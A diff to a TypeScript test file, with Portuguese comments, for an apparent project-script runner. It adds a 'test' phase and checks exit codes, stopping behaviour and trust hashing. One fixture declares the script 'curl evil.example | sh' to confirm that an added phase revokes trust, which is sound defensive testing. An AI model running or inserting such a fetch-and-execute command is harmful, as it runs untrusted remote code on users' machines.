@@ -79,13 +79,13 @@ afterEach(async () => {
 });
 
 describe("scripts.status", () => {
-  it("projeto sem o arquivo: as três fases vazias, e o caminho onde ele moraria", async () => {
+  it("projeto sem o arquivo: as quatro fases vazias, e o caminho onde ele moraria", async () => {
     // O estado normal, não o excepcional: é assim que todo projeto entra.
     const { ctx, worktreeId, worktreePath } = await setup();
 
     const status = await ctx.api.scripts.status({ scopeType: "worktree", scopeId: worktreeId });
 
-    expect(status.scripts).toEqual({ setup: null, run: null, teardown: null });
+    expect(status.scripts).toEqual({ setup: null, run: null, test: null, teardown: null });
     expect(status.file).toBe(join(worktreePath, PROJECT_FILE));
     expect(status.setup.last).toBeNull();
   });
@@ -245,6 +245,78 @@ describe("scripts.start", () => {
     const sessions = await ctx.api.session.listByScope(scope);
     expect(sessions.filter((row) => row.kind === "script")).toHaveLength(1);
     expect(sessions.filter((row) => row.kind === "shell")).toHaveLength(0);
+  });
+});
+
+describe("a fase de teste", () => {
+  it("roda a suíte declarada e guarda como ela terminou", async () => {
+    // A fase que entrou por uso: rodar teste é a coisa que mais se repete num dia,
+    // e ela estava fora do produto.
+    const { ctx, worktreeId, worktreePath } = await setup();
+    declare(worktreePath, { test: "echo verde > testou.txt" });
+    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;
+
+    await ctx.api.scripts.start({ ...scope, phase: "test" });
+    await waitExited(ctx, scope, "test");
+
+    const status = await ctx.api.scripts.status(scope);
+    expect(status.test.command).toBe("echo verde > testou.txt");
+    expect(status.test.last?.exitCode).toBe(0);
+    expect(existsSync(join(worktreePath, "testou.txt"))).toBe(true);
+  });
+
+  it("suíte vermelha vira código de saída, e não erro de chamada", async () => {
+    const { ctx, worktreeId, worktreePath } = await setup();
+    declare(worktreePath, { test: "exit 1" });
+    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;
+
+    await ctx.api.scripts.start({ ...scope, phase: "test" });
+    await waitExited(ctx, scope, "test");
+
+    expect((await ctx.api.scripts.status(scope)).test.last?.exitCode).toBe(1);
+  });
+
+  it("teste e run convivem: parar um não para o outro", async () => {
+    const { ctx, worktreeId, worktreePath } = await setup();
+    declare(worktreePath, { run: "sleep 30", test: "sleep 30" });
+    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;
+    await ctx.api.scripts.start({ ...scope, phase: "run" });
+    await ctx.api.scripts.start({ ...scope, phase: "test" });
+
+    await ctx.api.scripts.stop({ ...scope, phase: "test" });
+
+    // `waitFor` porque matar é assíncrono: o sinal vai, o `exit` volta depois.
+    await vi.waitFor(async () => {
+      const status = await ctx.api.scripts.status(scope);
+      expect(status.test.last?.running).toBe(false);
+      expect(status.run.last?.running).toBe(true);
+    });
+  });
+
+  it("confiar cobre as quatro fases, não três", async () => {
+    // O hash é sobre o conjunto: aprovar sem `test` e ganhar um `test` de brinde é
+    // o buraco que a S11 fecha.
+    const fixture = await setup();
+    await fixture.ctx.db
+      .update((await import("../db/schema.js")).project)
+      .set({ managed: true })
+      .where(
+        (await import("drizzle-orm")).eq(
+          (await import("../db/schema.js")).project.id,
+          fixture.projectId,
+        ),
+      );
+    declare(fixture.repo, { run: "pnpm dev" });
+    declare(fixture.worktreePath, { run: "pnpm dev" });
+    await fixture.ctx.api.scripts.trust({ scopeType: "worktree", scopeId: fixture.worktreeId });
+
+    declare(fixture.worktreePath, { run: "pnpm dev", test: "curl evil.example | sh" });
+
+    const status = await fixture.ctx.api.scripts.status({
+      scopeType: "worktree",
+      scopeId: fixture.worktreeId,
+    });
+    expect(status.trusted).toBe(false);
   });
 });
 
